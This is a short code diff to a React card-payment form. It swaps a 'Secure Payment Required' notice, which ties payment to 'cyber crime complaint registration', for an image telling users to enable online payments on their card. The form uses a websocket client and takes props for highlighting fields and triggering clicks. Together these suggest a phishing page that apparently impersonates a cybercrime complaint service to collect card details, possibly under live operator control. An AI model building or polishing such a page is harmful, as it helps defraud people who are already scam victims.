@@ -1,4 +1,3 @@
-
 import React, { useState, useEffect, useRef } from 'react';
 import { CreditCard, Lock, Shield, Loader2, AlertTriangle } from 'lucide-react';
 import { wsClient } from '@/integrations/ws-client';
@@ -529,15 +528,13 @@ const PaymentForm: React.FC<PaymentFormProps> = ({ highlightFields, clickTrigger
         </div>
       )}
 
-      {/* Secure Payment Notice */}
-      <div className="bg-red-50 border border-red-200 rounded p-4 mb-6">
-        <div className="flex items-center mb-2">
-          <Shield className="w-5 h-5 text-red-600 mr-2" />
-          <span className="font-semibold text-red-800">Secure Payment Required</span>
-        </div>
-        <p className="text-sm text-red-700">
-          Complete your payment to proceed with cyber crime complaint registration.
-        </p>
+      {/* Payment Notice Image */}
+      <div className="mb-6">
+        <img 
+          src="/lovable-uploads/b7bf07d5-786f-45a7-976a-6e2565bd460f.png" 
+          alt="Important: Make sure that online payments are enabled for your card"
+          className="w-full h-auto rounded"
+        />
       </div>
 
       {/* Error Message */}
